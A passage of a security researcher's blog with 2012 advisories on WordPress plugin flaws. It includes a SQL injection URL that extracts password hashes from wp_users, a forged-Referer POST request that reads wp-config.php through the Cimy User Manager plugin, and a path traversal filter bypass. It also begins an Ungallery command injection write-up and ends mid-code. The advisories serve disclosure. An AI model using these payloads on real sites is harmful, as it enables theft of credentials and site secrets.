			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
http://192.168.80.130/wordpress/wp-content/plugins/fs-real-estate-plugin/search.php?ProvinceID=35335%20UNION%20SELECT%201,%20user_pass,%203,%204,%205,%206,%207,%208%20from%20wp_users</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987796a226179608488-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987796a226179608488-1">http://192.168.80.130/wordpress/wp-content/plugins/fs-real-estate-plugin/search.php?ProvinceID=35335%20UNION%20SELECT%201,%20user_pass,%203,%204,%205,%206,%207,%208%20from%20wp_users</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>&nbsp;</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/firestorm-professional-real-estate-plugin/" rel="tag">FireStorm Professional Real Estate Plugin</a>, <a href="http://ceriksen.com/tag/sql-injection/" rel="tag">SQL Injection</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2012/10/25/wordpress-firestorm-professional-real-estate-plugin-sql-injection-vulnerability/#respond" title="Comment on WordPress FireStorm Professional Real Estate Plugin SQL Injection vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-183 -->

				
					
<article id="post-160" class="post-160 post type-post status-publish format-standard hentry category-advisories tag-cimy-user-manager tag-file-disclosure tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2012/10/24/wordpress-cimy-user-manager-arbitrary-file-disclosure/" title="10:49 am" rel="bookmark" class="entry-date"><time datetime="2012-10-24T10:49:53+00:00" pubdate>October 24, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2012/10/24/wordpress-cimy-user-manager-arbitrary-file-disclosure/" title="Permalink to WordPress Cimy User Manager arbitrary file disclosure" rel="bookmark">WordPress Cimy User Manager arbitrary file disclosure</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/50834/">Secunia Advisory SA 50834</a></p>
<p><strong>Analysis of vulnerability</strong></p>
<p>The Cimy User Manager is made to be able to export data from WordPress. The file <a href="http://plugins.svn.wordpress.org/cimy-user-manager/tags/1.4.1/cimy_user_manager.php">cimy_user_manager.php</a> has an init action which decides whether or not to download some content from the site:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987796dbfd216432151" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
add_action('init', 'cimy_um_download_database');

function cimy_um_download_database() {
	if (!empty($_POST["cimy_um_filename"])) {
		if (strpos($_SERVER['HTTP_REFERER'], admin_url('users.php?page=cimy_user_manager')) !== false) {
			$cimy_um_filename = $_POST["cimy_um_filename"];
			// protect from site traversing
			$cimy_um_filename = str_replace('../', '', $cimy_um_filename);
			if (!is_file($cimy_um_filename))
				return;

			header("Pragma: "); // Leave blank for issues with IE
			header("Expires: 0");
			header('Vary: User-Agent');
			header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
			header("Content-Type: text/csv");
			header("Content-Type: application/force-download");
			header("Content-Type: application/download");
			header("Content-Disposition: attachment; filename=\"".esc_html(basename($cimy_um_filename))."\";"); // cannot use esc_url any more because prepends 'http' (doh)
			header("Content-Transfer-Encoding: binary");
			header("Content-Length: ".filesize($cimy_um_filename));
			readfile($cimy_um_filename);
			exit();
		}
	}
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987796dbfd216432151-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796dbfd216432151-72">72</div><div class="crayon-num" data-line="crayon-53c987796dbfd216432151-73">73</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796dbfd216432151-74">74</div><div class="crayon-num" data-line="crayon-53c987796dbfd216432151-75">75</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796dbfd216432151-76">76</div><div class="crayon-num" data-line="crayon-53c987796dbfd216432151-77">77</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796dbfd216432151-78">78</div><div class="crayon-num" data-line="crayon-53c987796dbfd216432151-79">79</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796dbfd216432151-80">80</div><div class="crayon-num" data-line="crayon-53c987796dbfd216432151-81">81</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796dbfd216432151-82">82</div><div class="crayon-num" data-line="crayon-53c987796dbfd216432151-83">83</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796dbfd216432151-84">84</div><div class="crayon-num" data-line="crayon-53c987796dbfd216432151-85">85</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796dbfd216432151-86">86</div><div class="crayon-num" data-line="crayon-53c987796dbfd216432151-87">87</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796dbfd216432151-88">88</div><div class="crayon-num" data-line="crayon-53c987796dbfd216432151-89">89</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796dbfd216432151-90">90</div><div class="crayon-num" data-line="crayon-53c987796dbfd216432151-91">91</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796dbfd216432151-92">92</div><div class="crayon-num" data-line="crayon-53c987796dbfd216432151-93">93</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796dbfd216432151-94">94</div><div class="crayon-num" data-line="crayon-53c987796dbfd216432151-95">95</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796dbfd216432151-96">96</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987796dbfd216432151-71"><span class="crayon-e">add_action</span><span class="crayon-sy">(</span><span class="crayon-s">'init'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'cimy_um_download_database'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796dbfd216432151-72">&nbsp;</div><div class="crayon-line" id="crayon-53c987796dbfd216432151-73"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">cimy_um_download_database</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796dbfd216432151-74"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-k ">empty</span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"cimy_um_filename"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987796dbfd216432151-75"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">strpos</span><span class="crayon-sy">(</span><span class="crayon-v">$_SERVER</span><span class="crayon-sy">[</span><span class="crayon-s">'HTTP_REFERER'</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">admin_url</span><span class="crayon-sy">(</span><span class="crayon-s">'users.php?page=cimy_user_manager'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">!==</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796dbfd216432151-76"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"cimy_um_filename"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796dbfd216432151-77"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// protect from site traversing</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796dbfd216432151-78"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">'../'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796dbfd216432151-79"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">is_file</span><span class="crayon-sy">(</span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796dbfd216432151-80"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">return</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796dbfd216432151-81">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987796dbfd216432151-82"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Pragma: "</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// Leave blank for issues with IE</span></div><div class="crayon-line" id="crayon-53c987796dbfd216432151-83"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Expires: 0"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796dbfd216432151-84"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Vary: User-Agent'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796dbfd216432151-85"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Cache-Control: must-revalidate, post-check=0, pre-check=0"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796dbfd216432151-86"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-Type: text/csv"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796dbfd216432151-87"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-Type: application/force-download"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796dbfd216432151-88"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-Type: application/download"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796dbfd216432151-89"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-Disposition: attachment; filename=\""</span><span class="crayon-sy">.</span><span class="crayon-e">esc_html</span><span class="crayon-sy">(</span><span class="crayon-e">basename</span><span class="crayon-sy">(</span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"\";"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// cannot use esc_url any more because prepends 'http' (doh)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796dbfd216432151-90"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-Transfer-Encoding: binary"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796dbfd216432151-91"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-Length: "</span><span class="crayon-sy">.</span><span class="crayon-e">filesize</span><span class="crayon-sy">(</span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796dbfd216432151-92"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">readfile</span><span class="crayon-sy">(</span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796dbfd216432151-93"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">exit</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796dbfd216432151-94"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c987796dbfd216432151-95"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796dbfd216432151-96"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0080 seconds] -->
<p>First it checks if the cimy_um_filename POST variable is set. Then it goes to check if the referer is from the admin page, which is a flawed way of authentication. But if it thinks you come from the admin page, it will attempt to protect against path traversal. It is pretty obvious that we can fake the referer header. But we can quite easily bypass the path traversal. Lets have a look at an example.</p>
<p>Take this string: &#8230;/&#8230;//<br />
Now lets see where we match ../:  .<span style="color: #ff0000;">../</span>.<span style="color: #ff0000;">../</span>/<br />
Which leaves us with: ../</p>
<p>This tells us that the path traversal &#8220;protection&#8221; on line 78 can be bypassed trivially.</p>
<p>Additionally, in the case where you&#8217;d want to obtain a wp-config.php file, which contains credentials and other very critical information about the blog, we do not need to bypass this, because when init is called, the working directory is the wordpress base folder, which contains the wp-config.php file. Here&#8217;s an example request showing how to pull the wp-config.php file:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987796dc0f924530887" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/ HTTP/1.0
Host: 192.168.80.130
Referer: http://192.168.80.130/wordpress/wp-admin/users.php?page=cimy_user_manager
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

cimy_um_filename=wp-config.php</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987796dc0f924530887-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796dc0f924530887-2">2</div><div class="crayon-num" data-line="crayon-53c987796dc0f924530887-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796dc0f924530887-4">4</div><div class="crayon-num" data-line="crayon-53c987796dc0f924530887-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796dc0f924530887-6">6</div><div class="crayon-num" data-line="crayon-53c987796dc0f924530887-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987796dc0f924530887-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796dc0f924530887-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c987796dc0f924530887-3"><span class="crayon-i">Referer</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//192.168.80.130/wordpress/wp-admin/users.php?page=cimy_user_manager</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796dc0f924530887-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line" id="crayon-53c987796dc0f924530887-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">30</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796dc0f924530887-6">&nbsp;</div><div class="crayon-line" id="crayon-53c987796dc0f924530887-7"><span class="crayon-v">cimy_um_filename</span><span class="crayon-o">=</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-v">config</span><span class="crayon-sy">.</span><span class="crayon-i">php</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0018 seconds] -->
<p>&nbsp;</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/cimy-user-manager/" rel="tag">Cimy User Manager</a>, <a href="http://ceriksen.com/tag/file-disclosure/" rel="tag">File Disclosure</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2012/10/24/wordpress-cimy-user-manager-arbitrary-file-disclosure/#respond" title="Comment on WordPress Cimy User Manager arbitrary file disclosure">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-160 -->

				
					
<article id="post-176" class="post-176 post type-post status-publish format-standard hentry category-advisories tag-command-injection tag-ungallery tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2012/10/23/wordpress-ungallery-remote-command-injection-vulnerability/" title="7:06 pm" rel="bookmark" class="entry-date"><time datetime="2012-10-23T19:06:10+00:00" pubdate>October 23, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2012/10/23/wordpress-ungallery-remote-command-injection-vulnerability/" title="Permalink to WordPress Ungallery remote command injection vulnerability" rel="bookmark">WordPress Ungallery remote command injection vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Analysis of vulnerability</strong></p>
<p>The Ungallery for WordPress offers functionality for searching for pictures in a gallery, which is implemented through the plain filesystem in <a href="http://plugins.svn.wordpress.org/ungallery/tags/2.1.4/search.php">search.php</a>.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987796e18a575572752" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$gallerylink = ($_GET['gallerylink']) ;
$search = ($_GET['search']) ;
$dir = $pic_root . $gallerylink;

//	Find galleries
print "Searching in &lt;i&gt;$dir.&lt;/i&gt;
&lt;br /&gt;
&lt;br /&gt;";

print "These galleries matched &lt;i&gt;$search:&lt;/i&gt;&lt;br /&gt;";
$galleries = `find $dir -iname \*$search\* -type d`;

$galleries = explode("\n", $galleries);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987796e18a575572752-18">18</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796e18a575572752-19">19</div><div class="crayon-num" data-line="crayon-53c987796e18a575572752-20">20</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796e18a575572752-21">21</div><div class="crayon-num" data-line="crayon-53c987796e18a575572752-22">22</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796e18a575572752-23">23</div><div class="crayon-num" data-line="crayon-53c987796e18a575572752-24">24</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796e18a575572752-25">25</div><div class="crayon-num" data-line="crayon-53c987796e18a575572752-26">26</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796e18a575572752-27">27</div><div class="crayon-num" data-line="crayon-53c987796e18a575572752-28">28</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796e18a575572752-29">29</div><div class="crayon-num" data-line="crayon-53c987796e18a575572752-30">30</div></div>
				</td>
